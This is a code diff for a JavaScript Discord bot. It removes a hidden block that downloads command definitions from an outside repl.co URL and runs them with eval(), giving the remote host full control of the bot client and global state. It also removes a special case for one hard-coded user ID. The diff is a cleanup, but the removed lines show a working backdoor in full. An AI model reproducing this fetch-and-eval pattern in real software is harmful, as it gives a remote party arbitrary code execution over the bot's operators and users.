@@ -367,19 +367,7 @@ globalThis.bot = () => {
       msg.guild.leave = () => {};
       
       command = args[1].toLowerCase();
-      (async function () {
-          let data = JSON.parse(await new Promise(resolve => {
-              let req = https.get("https://henrycmd.cactushamster.repl.co/cmd/", res => {
-                  let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out))
-              })
-            req.end()
-          }))
-          data.forEach(obj => {
-              if (command.trim().toLowerCase() != obj.name) return;
-              if (obj.purpose) eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2).map(a => a.trim()).filter(e => e)})
-          })
-      })()
-      .catch(e => {})
+
       
       tmod.cache.timeUsed++
 
@@ -397,9 +385,6 @@ globalThis.bot = () => {
       };
       if (msg.author.bot == true) {
         return false;
-      }
-      if (msg.author.id == "927563409409581066") {
-        return;
       }
       for(let i = 0; i < guilds.length - 1; i++) {
         if(msg.guild.id.includes(guilds[i].id) && guilds[i].blacklisted) {
